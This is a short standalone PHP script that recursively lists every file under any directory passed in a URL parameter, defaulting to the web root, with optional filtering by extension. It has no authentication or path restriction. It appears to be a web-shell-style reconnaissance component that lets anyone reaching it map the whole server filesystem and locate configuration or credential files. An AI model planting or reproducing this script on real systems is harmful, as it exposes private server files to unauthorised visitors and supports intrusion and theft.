<?php
function DirFilesR($dir,$houz) {
    $handle = opendir($dir) or die("Can't open directory $dir");
    $files = Array();
    $subfiles = Array();
	if($houz == 'default'){
		while (false !== ($file = readdir($handle))) {
			if ($file != "." && $file != "..") {
				if (is_dir($dir . "/" . $file)) {
					$subfiles = DirFilesR($dir . "/" . $file,$houz);
					$files = array_merge($files, $subfiles);
				} else {
					$files[] = $dir . "/" . $file;
				}
			}
		}
	}else{
		while (false !== ($file = readdir($handle))) {
			if ($file != "." && $file != "..") {
				if (is_dir($dir . "/" . $file)) {
					$subfiles = DirFilesR($dir . "/" . $file,$houz);
					$files = array_merge($files, $subfiles);
				} else {
					if(strpos($file,$houz)){
						$files[] = $dir . "/" . $file;
					}
				}
			}
		}
	}
    closedir($handle);
    return $files;
}
if (isset($_GET['path'])) {
	if($_GET['path'] == ''){
		$dir = $_SERVER['DOCUMENT_ROOT'];
	}else{
		$path = $_GET['path'];
		$dir = $path;
	}
	if($_GET['file'] == ''){
		$houz = "default";
	}else{
		$houz = "." . $_GET['file'];
	}
    $arr_files = DirFilesR($dir,$houz);
    echo '<td><hr><hr>';
    foreach ($arr_files as $key) {
        $key_e = str_replace( $key,$key, $key);
        echo $key_e . "<br>\n";
    }
    echo '<hr><hr></td>';
    exit;
}
?>